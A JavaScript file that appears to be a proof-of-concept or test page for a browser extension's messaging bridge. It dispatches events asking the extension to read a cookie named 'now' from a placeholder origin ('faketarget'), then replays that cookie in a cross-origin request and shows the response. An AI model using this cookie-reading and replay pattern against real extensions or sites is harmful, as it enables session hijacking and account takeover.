var callbackRegistry = {};

function generateUniqueKey() {
  var key = '';
  for (var i = 0; i < 4; ++i) {
    key += Math.random().toString().substr(2);
  }
  if (callbackRegistry[key]) {
    key = generateUniqueKey();
  }
  return key;
}

function handlePassToPage(evt) {
  var detail = evt.detail;
  if (detail.action == 'getCookies' || detail.action == 'xhr') {
    if (detail.callbackKey !== undefined) {
      var callback = callbackRegistry[detail.callbackKey];
      if (callback) {
        callbackRegistry[detail.callbackKey] = undefined;
        callback.call(null, detail.result);
      } else {
        console.log("No callback for key " + detail.callbackKey);
      }
    }
  }
}

function passToBackground(message) {
  if (message.callback !== undefined) {
    message = Object.assign({}, message);
    var callbackKey = generateUniqueKey();

    callbackRegistry[callbackKey] = message.callback;
    delete message.callback;
    message.callbackKey = callbackKey;
  }

  var event = new CustomEvent("PassToBackground", {detail: message});
  window.dispatchEvent(event);
}

window.addEventListener("PassToPage", handlePassToPage);

var message = {
  action: 'getCookies',
  url: 'http://faketarget:8192/',
  cookieName: 'now',
  callback: function(result) {
    var cookieText = result.cookieName + '=' + result.cookieValue;
    $('#target-cookie').text('target cookie: ' + cookieText);

    passToBackground({
      action: 'xhr',
      xhr: {
        url: 'http://faketarget:8192/status',
        headers: {cookie: cookieText},
      },
      callback: function(result) {
        // data, status, xhr
        alert(result.responseText);
      },
    });
  },
};
passToBackground(message);

// Use this for debugging, to check that zepto.js is loaded
// and ajax works.
/*
$.ajax({url: 'http://faketarget:8192/status', success: function(data, status, xhr) {
  //alert(data)
  //debugger;
}});
*/
